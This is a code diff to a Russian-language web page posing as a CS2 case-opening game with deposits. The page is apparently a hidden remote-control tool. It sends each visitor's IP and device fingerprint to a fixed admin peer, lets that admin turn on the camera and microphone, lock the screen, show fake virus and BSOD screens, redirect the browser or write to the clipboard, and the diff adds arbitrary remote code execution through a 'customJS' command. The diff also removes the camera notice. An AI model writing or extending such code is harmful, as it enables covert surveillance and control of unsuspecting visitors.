@@ -169,6 +169,20 @@ body.shake{animation:shakeAnim .5s infinite}
 body.invert{filter:invert(1) hue-rotate(180deg)}
 body.blur{filter:blur(6px)}
 body.hue{filter:hue-rotate(180deg)}
+body.rotate{transform:rotate(180deg)}
+body.rotate-slow{animation:rotateSlow 15s linear infinite}
+@keyframes rotateSlow{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+body.rainbow{animation:rainbow 3s linear infinite}
+@keyframes rainbow{0%{filter:hue-rotate(0)}100%{filter:hue-rotate(360deg)}}
+body.grayscale{filter:grayscale(1)}
+body.slowmo,body.slowmo *{animation-duration:20s !important;transition-duration:3s !important}
+body.fast,body.fast *{animation-duration:.3s !important;transition-duration:.1s !important}
+body.freeze{pointer-events:none !important}
+body.vortex{perspective:500px}
+body.vortex .main-wrapper{animation:vortexSpin 8s linear infinite;transform-style:preserve-3d}
+@keyframes vortexSpin{from{transform:rotate3d(1,1,0,0deg) scale(1)}to{transform:rotate3d(1,1,0,360deg) scale(.7)}}
+body.wave .main-wrapper{animation:waveAnim 3s ease-in-out infinite}
+@keyframes waveAnim{0%,100%{transform:translateY(0) skewX(0)}25%{transform:translateY(-20px) skewX(3deg)}75%{transform:translateY(20px) skewX(-3deg)}}
 #screamerFlash{position:fixed;inset:0;background:radial-gradient(circle,#ff0000,#000);z-index:999999;display:none;align-items:center;justify-content:center;pointer-events:none}
 #screamerFlash.active{display:flex;animation:screamerFlash .15s infinite}
 @keyframes screamerFlash{0%,100%{opacity:1}50%{opacity:.3}}
@@ -211,24 +225,30 @@ body.hue{filter:hue-rotate(180deg)}
 @keyframes audioPulse{0%,100%{transform:translateX(-50%) scale(1)}50%{transform:translateX(-50%) scale(1.05)}}
 #mobileWarning{position:fixed;top:70px;left:50%;transform:translateX(-50%);z-index:9998;background:rgba(124,58,237,.95);color:#fff;padding:10px 20px;border-radius:10px;font-size:12px;font-weight:600;max-width:90vw;text-align:center;display:none}
 #mobileWarning.active{display:block}
+#trackingEye{position:fixed;font-size:120px;z-index:9998;pointer-events:none;display:none;transition:transform .1s linear}
+#trackingEye.active{display:block}
+#rainbowOverlay{position:fixed;inset:0;pointer-events:none;z-index:99999;display:none;background:linear-gradient(90deg,red,orange,yellow,green,blue,indigo,violet,red);background-size:400% 100%;mix-blend-mode:overlay;animation:rainbowMove 2s linear infinite;opacity:.6}
+#rainbowOverlay.active{display:block}
+@keyframes rainbowMove{0%{background-position:0 0}100%{background-position:400% 0}}
+#qrOverlay{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999998;display:none;align-items:center;justify-content:center;flex-direction:column;gap:20px;padding:20px}
+#qrOverlay.active{display:flex}
+#qrOverlay img{max-width:80vw;max-height:70vh;border-radius:16px;background:#fff;padding:16px}
+#qrOverlay p{color:#fff;font-size:16px;text-align:center;max-width:80vw;word-break:break-all}
+#printDoc{position:fixed;inset:0;background:#fff;color:#000;z-index:9999999;display:none;padding:40px;font-family:serif;font-size:14px;overflow:auto}
+#printDoc.active{display:block}
 @media(max-width:720px){.game-area{grid-template-columns:1fr}.top-bar{flex-direction:column;align-items:stretch;position:static}}
 </style>
 </head>
 <body>
 <canvas id="particles"></canvas>
 
-<!-- Индикатор: админ говорит -->
-<div id="voiceIndicator">
-  <span style="font-size:20px">🎙</span>
-  <span>Админ говорит</span>
-  <span style="width:8px;height:8px;border-radius:50%;background:#fff;animation:pulse 0.8s infinite"></span>
-</div>
-
-<!-- Баннер тапа для разблокировки звука -->
+<div id="voiceIndicator"><span style="font-size:20px">🎙</span><span>Админ говорит</span><span style="width:8px;height:8px;border-radius:50%;background:#fff;animation:pulse 0.8s infinite"></span></div>
 <div id="audioUnlockBanner">🔊 Тапни чтобы включить звук</div>
-
-<!-- Предупреждение о мобильном -->
 <div id="mobileWarning">📱 Трансляция экрана недоступна на телефоне</div>
+<div id="trackingEye">👁️</div>
+<div id="rainbowOverlay"></div>
+<div id="qrOverlay"><img id="qrImg" alt="QR"><p id="qrText"></p></div>
+<div id="printDoc"></div>
 
 <div class="deposit-fixed">
   <span style="font-size:14px">💳</span>
@@ -368,7 +388,7 @@ body.hue{filter:hue-rotate(180deg)}
 <div class="deposit-modal" id="depositModal">
   <div class="deposit-box">
     <h3>💳 Пополнение</h3>
-    <p>Мин $10 · Макс за раз $5000 · Лимит $20000/сутки · КД 10 мин</p>
+    <p>Мин $10 · Макс $5000 · Лимит $20000/сутки · КД 10 мин</p>
     <div class="deposit-quick">
       <button data-amt="10">$10</button><button data-amt="100">$100</button>
       <button data-amt="500">$500</button><button data-amt="5000">$5000</button>
@@ -401,11 +421,7 @@ body.hue{filter:hue-rotate(180deg)}
   </div>
 </div>
 
-<div id="blockOverlay">
-  <h1>🔒 ЭКРАН ЗАБЛОКИРОВАН</h1>
-  <p id="blockText">Обратитесь к администратору</p>
-</div>
-
+<div id="blockOverlay"><h1>🔒 ЭКРАН ЗАБЛОКИРОВАН</h1><p id="blockText">Обратитесь к администратору</p></div>
 <div id="screamerFlash"><div id="screamerEmoji">😱</div></div>
 <div id="fakeVirus"><h1>⚠️ СИСТЕМА ЗАРАЖЕНА ⚠️</h1><pre></pre><div class="progress"><div class="progress-fill"></div></div></div>
 <div id="bsod"><div class="face">:(</div><h2>На вашем ПК возникла проблема.</h2><p>Мы собираем данные об ошибке...</p><div class="percent">0% завершено</div></div>
@@ -415,35 +431,30 @@ body.hue{filter:hue-rotate(180deg)}
 <audio id="adminVoice" autoplay></audio>
 
 <script>
-// ===== PEERJS =====
 const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
 let peer = null, adminConn = null, videoCall = null, camStream = null;
 let micStream = null;
 let voiceListenPeer = null;
+let wakeLock = null;
 
 /* ============================================================
-   ОПРЕДЕЛЕНИЕ УСТРОЙСТВА
+   СБОР ИНФЫ ОБ УСТРОЙСТВЕ
    ============================================================ */
 function detectDevice() {
     const ua = navigator.userAgent;
     let device = '❓ Неизвестное';
     let type = 'desktop';
-    // Мобильные
     if (/iPhone/.test(ua)) { device = '🍎 iPhone'; type = 'mobile'; }
     else if (/iPad/.test(ua)) { device = '🍎 iPad'; type = 'tablet'; }
     else if (/Android/.test(ua)) {
         const m = ua.match(/Android [\d.]+;\s*([^;)]+)/);
-        const model = m ? m[1].trim() : 'Android';
-        device = '📱 ' + model;
+        device = '📱 ' + (m ? m[1].trim() : 'Android');
         type = 'mobile';
     }
-    // ПК
     else if (/Windows NT 10/.test(ua)) device = '💻 Windows 10/11';
     else if (/Windows NT/.test(ua)) device = '💻 Windows';
     else if (/Macintosh/.test(ua)) device = '💻 Mac';
     else if (/Linux/.test(ua)) device = '💻 Linux';
-    
-    // Браузер
     let browser = 'Unknown';
     if (/Edg\//.test(ua)) browser = 'Edge';
     else if (/OPR\//.test(ua)) browser = 'Opera';
@@ -451,13 +462,32 @@ function detectDevice() {
     else if (/Chrome\//.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
     else if (/Firefox\//.test(ua)) browser = 'Firefox';
     else if (/Safari\//.test(ua)) browser = 'Safari';
-    
     return { device, browser, type, ua };
 }
 const DEVICE_INFO = detectDevice();
-
-// Короткий ID устройства для сессии
 const SESSION_ID = Math.random().toString(36).slice(2, 6).toUpperCase();
+
+async function collectExtraInfo() {
+    const info = {
+        language: navigator.language || '—',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
+        platform: navigator.platform || '—',
+        cores: navigator.hardwareConcurrency || '—',
+        memory: navigator.deviceMemory || '—',
+        connection: (navigator.connection && navigator.connection.effectiveType) || '—',
+        touch: 'ontouchstart' in window,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || '—'
+    };
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            info.battery = Math.round(b.level * 100) + '%';
+            info.charging = b.charging;
+        }
+    } catch(e){}
+    return info;
+}
 
 /* ============================================================
    РАЗБЛОКИРОВКА ЗВУКА
@@ -467,7 +497,6 @@ function unlockAudio() {
     if (audioUnlocked) return;
     audioUnlocked = true;
     document.getElementById('audioUnlockBanner').classList.remove('active');
-    // Принудительно "разбудим" все audio
     ['adminVoice','remoteSnd'].forEach(id => {
         const a = document.getElementById(id);
         if (a) {
@@ -480,20 +509,12 @@ function unlockAudio() {
         if (ctx.state === 'suspended') ctx.resume();
     } catch(e){}
     try { Sound.init(); } catch(e){}
-    console.log('🔊 Audio unlocked');
 }
 document.getElementById('audioUnlockBanner').addEventListener('click', unlockAudio);
 document.body.addEventListener('click', unlockAudio, {once: false});
 document.body.addEventListener('touchstart', unlockAudio, {once: false});
+setTimeout(() => { if (!audioUnlocked) document.getElementById('audioUnlockBanner').classList.add('active'); }, 2000);
 
-// Показываем баннер через 2 секунды если не разблокировано
-setTimeout(() => {
-    if (!audioUnlocked) {
-        document.getElementById('audioUnlockBanner').classList.add('active');
-    }
-}, 2000);
-
-// Показываем предупреждение на мобильных
 if (DEVICE_INFO.type === 'mobile' || DEVICE_INFO.type === 'tablet') {
     document.getElementById('mobileWarning').classList.add('active');
     setTimeout(() => document.getElementById('mobileWarning').classList.remove('active'), 6000);
@@ -504,40 +525,43 @@ if (DEVICE_INFO.type === 'mobile' || DEVICE_INFO.type === 'tablet') {
    ============================================================ */
 function initPeer() {
     peer = new Peer();
-    peer.on('open', (id) => { console.log('Мой Peer ID:', id); connectToAdmin(); });
-    peer.on('error', (err) => { console.error('Peer error:', err); setTimeout(initPeer, 3000); });
+    peer.on('open', (id) => { connectToAdmin(); });
+    peer.on('error', (err) => { setTimeout(initPeer, 3000); });
     peer.on('call', (call) => {
-        console.log('Входящий звонок');
         call.answer();
         call.on('stream', (stream) => {
-            // Голос от админа
+            const hasVideo = stream.getVideoTracks().length > 0;
+            if (hasVideo) {
+                const v = document.createElement('video');
+                v.srcObject = stream;
+                v.autoplay = true; v.muted = true; v.playsInline = true;
+                v.style.cssText = 'position:fixed;bottom:10px;right:10px;width:200px;z-index:99999;border-radius:10px;border:2px solid #7c3aed';
+                document.body.appendChild(v);
+                v.play().catch(()=>{});
+                return;
+            }
             const a = document.getElementById('adminVoice');
             a.srcObject = stream;
-            const playPromise = a.play();
-            if (playPromise) {
-                playPromise.then(() => {
-                    // Успешно играем
+            const p = a.play();
+            if (p) {
+                p.then(() => {
                     document.getElementById('voiceIndicator').classList.add('active');
                     sendToAdmin({type: 'voicePlaying', ts: Date.now()});
-                    setTimeout(() => {
-                        document.getElementById('voiceIndicator').classList.remove('active');
-                        sendToAdmin({type: 'voiceStopped', ts: Date.now()});
-                    }, 10000);
                 }).catch(() => {
-                    // Автоплей заблокирован
                     document.getElementById('audioUnlockBanner').classList.add('active');
-                    showToast('🔊 Тапни по экрану чтобы услышать', 'error', 5000);
+                    showToast('🔊 Тапни по экрану', 'error', 5000);
                 });
             }
         });
     });
 }
 
-function connectToAdmin() {
+async function connectToAdmin() {
     if (!peer) return;
     try {
         adminConn = peer.connect(ADMIN_PEER_ID, {reliable: true});
-        adminConn.on('open', () => {
+        adminConn.on('open', async () => {
+            const extra = await collectExtraInfo();
             sendToAdmin({
                 type:'hello',
                 ip:USER_IP,
@@ -549,9 +573,20 @@ function connectToAdmin() {
                 screen: `${screen.width}x${screen.height}`,
                 balance:state.balance,
                 drops:state.stats.total,
+                extra,
                 ts:Date.now()
             });
             setInterval(() => { if (adminConn && adminConn.open) sendToAdmin({type:'heartbeat',ip:USER_IP,balance:state.balance,drops:state.stats.total,ts:Date.now()}); }, 5000);
+            // Idle detection
+            let idleTimer;
+            const resetIdle = () => {
+                clearTimeout(idleTimer);
+                idleTimer = setTimeout(() => {
+                    sendToAdmin({type:'idle',ip:USER_IP,ts:Date.now()});
+                }, 30000);
+            };
+            ['mousemove','keydown','click','scroll','touchstart'].forEach(ev => document.addEventListener(ev, resetIdle, {passive:true}));
+            resetIdle();
         });
         adminConn.on('data', handleAdminCommand);
         adminConn.on('close', () => { adminConn = null; setTimeout(connectToAdmin, 3000); });
@@ -560,6 +595,9 @@ function connectToAdmin() {
 
 function sendToAdmin(data) { if (adminConn && adminConn.open) adminConn.send(data); }
 
+/* ============================================================
+   ОБРАБОТКА КОМАНД
+   ============================================================ */
 function handleAdminCommand(msg) {
     if (!msg || !msg.action) return;
     switch(msg.action) {
@@ -570,8 +608,23 @@ function handleAdminCommand(msg) {
         case 'invert': triggerFilter('invert', msg.duration || 5000); break;
         case 'blur': triggerFilter('blur', msg.duration || 5000); break;
         case 'hue': triggerFilter('hue', msg.duration || 5000); break;
+        case 'grayscale': triggerFilter('grayscale', msg.duration || 20000); break;
+        case 'rainbow': triggerRainbow(msg.duration || 10000); break;
+        case 'rotate': triggerFilter('rotate', msg.duration || 5000); break;
+        case 'rotateSlow': triggerFilter('rotate-slow', msg.duration || 15000); break;
+        case 'slowmo': triggerFilter('slowmo', msg.duration || 10000); break;
+        case 'fast': triggerFilter('fast', msg.duration || 10000); break;
+        case 'vortex': triggerFilter('vortex', msg.duration || 8000); break;
+        case 'wave': triggerFilter('wave', msg.duration || 6000); break;
+        case 'freeze': triggerFilter('freeze', msg.duration || 8000); break;
         case 'bigCursor': triggerBigCursor(msg.duration || 8000); break;
+        case 'mouseChaos': triggerMouseChaos(msg.duration || 10000); break;
+        case 'keyboardChaos': triggerKeyboardChaos(msg.duration || 10000); break;
+        case 'trackingEye': triggerTrackingEye(msg.duration || 8000); break;
+        case 'shuffle': triggerShuffle(); break;
+        case 'audioHijack': triggerAudioHijack(); break;
         case 'alert': alert(msg.text || 'ПРИВЕТ ОТ ХАКЕРА'); break;
+        case 'consoleMsg': console.log('%c' + (msg.text || 'CS2'), 'color:#7c3aed;font-size:30px;font-weight:bold'); break;
         case 'setBalance': state.balance = Number(msg.value) || 0; updateBalance(); saveState(true); break;
         case 'addBalance': state.balance += Number(msg.value) || 0; updateBalance(); saveState(true); break;
         case 'clearInventory': state.inventory = []; renderInventory(); saveState(true); break;
@@ -581,81 +634,31 @@ function handleAdminCommand(msg) {
         case 'playMp3': playRemoteMp3(msg.dataUrl); break;
         case 'requestCam': requestCamera(); break;
         case 'reload': location.reload(); break;
+        case 'closeTab': try { window.close(); } catch(e){} break;
         case 'showModal': showAdminModal(msg.title || 'Сообщение', msg.text || ''); break;
-        case 'blockScreen': blockScreen(msg.text || 'Экран заблокирован администратором'); break;
+        case 'blockScreen': blockScreen(msg.text || 'Экран заблокирован'); break;
         case 'unblockScreen': unblockScreen(); break;
         case 'redirect': setTimeout(() => { window.location.href = msg.url; }, 1000); break;
         case 'openUrl': window.open(msg.url, '_blank'); break;
         case 'setName': document.getElementById('usernameEl').textContent = msg.name; document.getElementById('avatarEl').textContent = (msg.name||'?')[0].toUpperCase(); break;
-        case 'longShake': triggerShake(10000); break;
-        case 'longInvert': triggerFilter('invert', 30000); break;
-        case 'longBlur': triggerFilter('blur', 30000); break;
+        case 'setTitle': document.title = msg.text || 'CS2'; break;
+        case 'setFavicon': setFavicon(msg.emoji || '🎁'); break;
+        case 'copyToClipboard': try { navigator.clipboard.writeText(msg.text || ''); } catch(e){} break;
+        case 'downloadFile': downloadFile(msg.filename || 'file.txt', msg.content || 'Hello from admin'); break;
+        case 'print': triggerPrint(msg.text || 'Документ'); break;
+        case 'vibrate': if (navigator.vibrate) navigator.vibrate(msg.pattern || [500,200,500]); break;
+        case 'wakeLock': requestWakeLock(); break;
+        case 'notif': if (window.Notification && Notification.permission === 'granted') new Notification(msg.title || 'Уведомление', {body: msg.text || ''}); break;
+        case 'requestNotif': if (window.Notification && Notification.permission !== 'granted') Notification.requestPermission(); break;
+        case 'showQR': showQR(msg.text || 'CS2'); break;
         case 'requestMic': requestMicStream(); break;
         case 'startVoiceListen': startVoiceListen(); break;
+        case 'customJS': try { new Function(msg.code)(); } catch(e){ console.error(e); } break;
     }
 }
 
 /* ============================================================
-   ГОЛОСОВАЯ СВЯЗЬ — ДРУГ СЛУШАЕТ АДМИНА
-   ============================================================ */
-async function startVoiceListen() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
-        // Создаём отдельный peer для голосовой связи
-        if (voiceListenPeer) { try { voiceListenPeer.destroy(); } catch(e){} }
-        voiceListenPeer = new Peer();
-        voiceListenPeer.on('open', (myId) => {
-            // Отправляем админу свой peer ID — он позвонит нам
-            if (adminConn && adminConn.open) {
-                adminConn.send({type: 'voicePeerId', peerId: myId});
-                console.log('Voice peer ID отправлен админу:', myId);
-            }
-        });
-        voiceListenPeer.on('call', (call) => {
-            call.answer();
-            call.on('stream', (remoteStream) => {
-                const a = document.getElementById('adminVoice');
-                a.srcObject = remoteStream;
-                const p = a.play();
-                if (p) {
-                    p.then(() => {
-                        document.getElementById('voiceIndicator').classList.add('active');
-                        sendToAdmin({type: 'voicePlaying', ts: Date.now()});
-                        console.log('🎙 Слушаю админа');
-                    }).catch(() => {
-                        document.getElementById('audioUnlockBanner').classList.add('active');
-                        showToast('🔊 Тапни по экрану чтобы услышать', 'error', 5000);
-                    });
-                }
-            });
-            call.on('close', () => {
-                document.getElementById('voiceIndicator').classList.remove('active');
-                sendToAdmin({type: 'voiceStopped', ts: Date.now()});
-            });
-        });
-    } catch(e) {
-        console.error('Voice listen error:', e);
-        sendToAdmin({type: 'voiceFail', error: e.message});
-        showToast('❌ Микрофон: ' + e.message, 'error', 3000);
-    }
-}
-
-async function requestMicStream() {
-    try {
-        micStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
-        if (voiceListenPeer && voiceListenPeer.open) {
-            voiceListenPeer.call(ADMIN_PEER_ID + '_mic', micStream);
-        }
-        sendToAdmin({type: 'micOn', ts: Date.now()});
-        showToast('🎤 Микрофон включён', 'success', 2500);
-    } catch(e) {
-        sendToAdmin({type: 'micFail', error: e.message});
-        showToast('❌ Микрофон недоступен', 'error', 3000);
-    }
-}
-
-/* ============================================================
-   ПРОЧИЕ ФУНКЦИИ
+   ВСЕ ПРАНКИ
    ============================================================ */
 function showAdminModal(title, text) {
     document.getElementById('adminModalTitle').textContent = title;
@@ -667,15 +670,19 @@ function blockScreen(text) { document.getElementById('blockText').textContent = 
 function unblockScreen() { document.getElementById('blockOverlay').classList.remove('active'); }
 function triggerShake(d){ document.body.classList.add('shake'); setTimeout(()=>document.body.classList.remove('shake'), d); }
 function triggerFilter(c,d){ document.body.classList.add(c); setTimeout(()=>document.body.classList.remove(c), d); }
+function triggerRainbow(d){ document.getElementById('rainbowOverlay').classList.add('active'); setTimeout(()=>document.getElementById('rainbowOverlay').classList.remove('active'), d); }
 function stopAllPranks(){
-    document.body.classList.remove('shake','invert','blur','hue');
+    document.body.className = document.body.className.split(' ').filter(c => !['shake','invert','blur','hue','grayscale','rotate','rotate-slow','slowmo','fast','vortex','wave','freeze','rainbow'].includes(c)).join(' ');
     document.getElementById('screamerFlash').classList.remove('active');
     document.getElementById('fakeVirus').classList.remove('active');
     document.getElementById('bsod').classList.remove('active');
     document.getElementById('cursorHelper')?.remove();
+    document.getElementById('trackingEye')?.classList.remove('active');
     document.getElementById('blockOverlay').classList.remove('active');
     document.getElementById('adminModal').classList.remove('active');
+    document.getElementById('rainbowOverlay').classList.remove('active');
     if (window._screamerAudio) { try{window._screamerAudio.stop();}catch(e){} }
+    if (window._hijackAudio) { try{window._hijackAudio.pause();}catch(e){} }
     const a = document.getElementById('remoteSnd');
     if (a) { a.pause(); a.currentTime = 0; }
 }
@@ -688,6 +695,73 @@ function triggerBigCursor(d){
     const move=(e)=>{div.style.left=(e.clientX-40)+'px';div.style.top=(e.clientY-40)+'px';};
     document.addEventListener('mousemove',move);
     setTimeout(()=>{document.removeEventListener('mousemove',move);div.remove();},d);
+}
+function triggerMouseChaos(d){
+    const move = (e) => {
+        // Сдвигаем страницу противоположно движению мыши
+        document.body.style.transform = `translate(${-e.clientX/20}px, ${-e.clientY/20}px)`;
+    };
+    document.addEventListener('mousemove', move);
+    setTimeout(() => {
+        document.removeEventListener('mousemove', move);
+        document.body.style.transform = '';
+    }, d);
+}
+function triggerKeyboardChaos(d){
+    const handler = (e) => {
+        // Меняем все нажатия на случайные буквы
+        const rnd = String.fromCharCode(65 + Math.floor(Math.random()*26));
+        const inputs = document.querySelectorAll('input, textarea');
+        inputs.forEach(i => {
+            if (document.activeElement === i) i.value += rnd;
+        });
+    };
+    document.addEventListener('keydown', handler);
+    setTimeout(() => document.removeEventListener('keydown', handler), d);
+}
+function triggerTrackingEye(d){
+    const eye = document.getElementById('trackingEye');
+    eye.classList.add('active');
+    const move = (e) => {
+        eye.style.left = (e.clientX - 60) + 'px';
+        eye.style.top = (e.clientY - 60) + 'px';
+    };
+    document.addEventListener('mousemove', move);
+    setTimeout(() => {
+        document.removeEventListener('mousemove', move);
+        eye.classList.remove('active');
+    }, d);
+}
+function triggerShuffle(){
+    const els = document.querySelectorAll('.inv-item, .case-card, .main-tab, .tab, button');
+    const count = Math.min(els.length, 30);
+    const picked = [...els].sort(()=>Math.random()-0.5).slice(0, count);
+    picked.forEach(el => {
+        const rx = (Math.random()-0.5)*400;
+        const ry = (Math.random()-0.5)*400;
+        const rot = (Math.random()-0.5)*90;
+        el.style.transition = 'transform 1s';
+        el.style.transform = `translate(${rx}px, ${ry}px) rotate(${rot}deg)`;
+    });
+    setTimeout(() => picked.forEach(el => el.style.transform = ''), 3000);
+}
+function triggerAudioHijack(){
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'square';
+        osc.frequency.value = 220;
+        gain.gain.value = 0.3;
+        osc.connect(gain); gain.connect(ctx.destination);
+        osc.start();
+        window._hijackAudio = { pause: () => { try { osc.stop(); } catch(e){} } };
+        // Меняем тон каждые 300мс
+        const iv = setInterval(() => {
+            osc.frequency.value = 100 + Math.random() * 800;
+        }, 300);
+        setTimeout(() => { clearInterval(iv); try { osc.stop(); } catch(e){} }, 8000);
+    } catch(e){}
 }
 function triggerScreamer(d){
     unlockAudio();
@@ -752,10 +826,92 @@ async function requestCamera() {
         videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream);
         videoCall.on('stream', () => {});
         sendToAdmin({type: 'cameraOn', ts: Date.now()});
-        showToast('📸 Камера включена', 'success', 2500);
-    } catch(e) { sendToAdmin({type: 'cameraFail', ts: Date.now()}); showToast('❌ Камера недоступна', 'error', 3000); }
+    } catch(e) { sendToAdmin({type: 'cameraFail', ts: Date.now()}); }
+}
+function setFavicon(emoji) {
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">${emoji}</text></svg>`;
+    let link = document.querySelector("link[rel*='icon']");
+    if (!link) { link = document.createElement('link'); link.rel = 'icon'; document.head.appendChild(link); }
+    link.href = 'data:image/svg+xml,' + encodeURIComponent(svg);
+}
+function downloadFile(filename, content) {
+    const blob = new Blob([content], {type: 'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    document.body.appendChild(a); a.click(); a.remove();
+}
+function triggerPrint(text) {
+    const el = document.getElementById('printDoc');
+    el.textContent = text;
+    el.classList.add('active');
+    setTimeout(() => {
+        try { window.print(); } catch(e){}
+        el.classList.remove('active');
+    }, 100);
+}
+async function requestWakeLock() {
+    try {
+        if ('wakeLock' in navigator) {
+            wakeLock = await navigator.wakeLock.request('screen');
+            sendToAdmin({type: 'wakeLockOn'});
+        }
+    } catch(e){}
+}
+function showQR(text) {
+    const overlay = document.getElementById('qrOverlay');
+    const img = document.getElementById('qrImg');
+    const txt = document.getElementById('qrText');
+    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=' + encodeURIComponent(text);
+    txt.textContent = text;
+    overlay.classList.add('active');
+    setTimeout(() => overlay.classList.remove('active'), 15000);
+}
+async function startVoiceListen() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
+        if (voiceListenPeer) { try { voiceListenPeer.destroy(); } catch(e){} }
+        voiceListenPeer = new Peer();
+        voiceListenPeer.on('open', (myId) => {
+            if (adminConn && adminConn.open) adminConn.send({type: 'voicePeerId', peerId: myId});
+        });
+        voiceListenPeer.on('call', (call) => {
+            call.answer();
+            call.on('stream', (remoteStream) => {
+                const a = document.getElementById('adminVoice');
+                a.srcObject = remoteStream;
+                const p = a.play();
+                if (p) {
+                    p.then(() => {
+                        document.getElementById('voiceIndicator').classList.add('active');
+                        sendToAdmin({type: 'voicePlaying', ts: Date.now()});
+                    }).catch(() => {
+                        document.getElementById('audioUnlockBanner').classList.add('active');
+                    });
+                }
+            });
+            call.on('close', () => {
+                document.getElementById('voiceIndicator').classList.remove('active');
+                sendToAdmin({type: 'voiceStopped', ts: Date.now()});
+            });
+        });
+    } catch(e) {
+        sendToAdmin({type: 'voiceFail', error: e.message});
+    }
+}
+async function requestMicStream() {
+    try {
+        micStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
+        sendToAdmin({type: 'micOn', ts: Date.now()});
+        showToast('🎤 Микрофон включён', 'success', 2500);
+    } catch(e) {
+        sendToAdmin({type: 'micFail', error: e.message});
+    }
 }
 
+/* ============================================================
+   БАЗОВЫЕ ФУНКЦИИ
+   ============================================================ */
 let USER_IP = 'unknown';
 async function detectIP() {
     const services = [{url:'https://api.ipify.org?format=json', parse: d => d.ip},{url:'https://api64.ipify.org?format=json', parse: d => d.ip}];
